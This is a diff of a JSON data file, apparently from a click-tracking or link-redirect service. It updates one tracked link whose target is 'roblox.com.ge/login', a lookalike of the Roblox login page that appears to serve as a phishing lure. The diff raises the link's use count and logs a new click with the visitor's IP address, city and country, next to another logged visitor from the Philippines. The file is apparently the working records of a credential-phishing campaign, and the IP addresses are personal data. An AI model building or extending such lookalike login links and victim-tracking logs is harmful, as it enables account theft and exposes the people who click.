@@ -110,7 +110,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 856,
+    "useCount": 857,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6956,6 +6956,14 @@
       {
         "timestamp": 1777184725295,
         "ip": "136.158.11.138",
+        "country": "Philippines",
+        "city": "Quezon City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777184875287,
+        "ip": "157.20.143.213",
         "country": "Philippines",
         "city": "Quezon City",
         "flag": "🇵🇭",
